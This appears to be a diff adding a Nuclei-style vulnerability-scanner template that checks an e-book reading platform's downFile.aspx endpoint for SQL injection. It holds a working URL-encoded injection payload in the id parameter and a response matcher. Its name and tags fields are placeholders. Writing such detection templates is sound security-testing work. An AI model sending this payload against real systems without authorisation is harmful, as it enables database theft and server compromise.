@@ -1,0 +1,17 @@
+id: dzts-downFile-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 电子图书阅读平台 downFile.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287828%3D7828%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%29%2B%27"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qzqzq'
